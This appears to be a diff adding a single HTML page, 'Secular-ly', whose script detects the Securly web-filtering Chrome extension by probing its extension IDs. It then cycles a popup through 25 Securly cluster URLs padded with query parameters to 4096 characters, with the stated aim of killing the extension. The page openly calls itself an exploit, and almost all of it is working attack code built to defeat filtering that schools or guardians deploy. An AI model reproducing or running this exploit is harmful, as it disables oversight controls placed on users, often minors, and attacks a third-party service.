@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <title>Secular-ly</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width">
+    <style>
+      :root {
+        color-scheme: dark;
+        --bg: #101014;
+        --fg: #e8e6e3;
+        --dim: #8b8794;
+        --accent: #7c5cff;
+      }
+      * { box-sizing: border-box; }
+      body {
+        margin: 0;
+        min-height: 100vh;
+        display: grid;
+        place-items: center;
+        background: var(--bg);
+        color: var(--fg);
+        font: 16px/1.5 system-ui, sans-serif;
+        padding: 24px;
+      }
+      main {
+        width: 100%;
+        max-width: 420px;
+        text-align: center;
+      }
+      h1 {
+        margin: 0 0 8px;
+        font-size: 28px;
+        letter-spacing: -0.02em;
+      }
+      p {
+        margin: 0 0 24px;
+        color: var(--dim);
+      }
+      button {
+        width: 100%;
+        padding: 14px;
+        font: inherit;
+        font-weight: 600;
+        color: #fff;
+        background: var(--accent);
+        border: 0;
+        border-radius: 10px;
+        cursor: pointer;
+      }
+      button:hover { filter: brightness(1.15); }
+      button:disabled {
+        opacity: 0.5;
+        cursor: default;
+      }
+      #status {
+        margin-top: 16px;
+        min-height: 1.5em;
+        font-size: 14px;
+        color: var(--dim);
+        font-variant-numeric: tabular-nums;
+      }
+      #status.err { color: #ff6b6b; }
+    </style>
+    <script>
+      const from_id = (id) => document.getElementById(id);
+      const ext_ids = [
+        "iheobagjkfklnlikgihanlhcddjoihkg",
+        "joflmkccibkooplaeoinecjbmdebglab",
+        "ckecmkbnoanpgplccmnoikfmpcdladkc",
+        "kfiocjonplkilcjfgabfngiddebalkod",
+        "bmlalgfmolfmkjmnikbphgijefopggme"
+      ];
+      const clusters = ["www", "useast-www", "useast2-www", "ca-www", "uk-www"];
+      const param_names = ["utm_source", "utm_medium", "utm_campaign", "utm_term", "utm_content"];
+
+      const setStatus = (msg, isErr) => {
+        const el = from_id("status");
+        el.innerText = msg;
+        el.classList.toggle("err", !!isErr);
+      };
+
+      function sleep(ms) {
+        return new Promise(resolve => setTimeout(resolve, ms));
+      }
+
+      function detect_ext() {
+        return new Promise((resolve, reject) => {
+          for (let id of ext_ids) {
+            let url = `chrome-extension://${id}/tt-alert.svg`;
+            fetch(url).then(() => resolve(true));
+          }
+          setTimeout(() => resolve(false), 500);
+        });
+      }
+
+      async function disable_ext() {
+        const btn = from_id("disable_button");
+        btn.disabled = true;
+
+        let w = null;
+        let i = 1;
+        let total = clusters.length * param_names.length;
+        for (let cluster of clusters) {
+          for (let param of param_names) {
+            let url = `https://${cluster}.securly.com/please_wait/${i}/${total}?${param}=`;
+            url += "a".repeat(4096 - url.length);
+
+            if (!w) {
+              w = window.open(url, "", "width=400,height=1");
+              await sleep(2000);
+            }
+            else {
+              w.location.href = url;
+              await sleep(2000);
+            }
+            setStatus(`${i} / ${total}`);
+            i++;
+          }
+        }
+        w.close();
+        setStatus("Done. Reopen your tab.");
+        btn.disabled = false;
+      }
+
+      async function main() {
+        setStatus("Detecting extension…");
+
+        let ext_detected = await detect_ext();
+        if (!ext_detected) {
+          setStatus("Securly doesn't appear to be installed.", true);
+          return;
+        }
+
+        setStatus("Allow popups, then click.");
+        const btn = from_id("disable_button");
+        btn.style.display = "block";
+        btn.onclick = disable_ext;
+      }
+
+      window.onload = main;
+    </script>
+  </head>
+  <body>
+    <main>
+      <h1>Secular-ly</h1>
+      <p>Kills the Securly filtering extension. Allow popups, then click and wait.</p>
+      <button id="disable_button" style="display: none">Disable Securly</button>
+      <div id="status"></div>
+      <noscript>
+        <p>JavaScript is off — this page can't run the exploit.</p>
+      </noscript>
+    </main>
+  </body>
+</html>
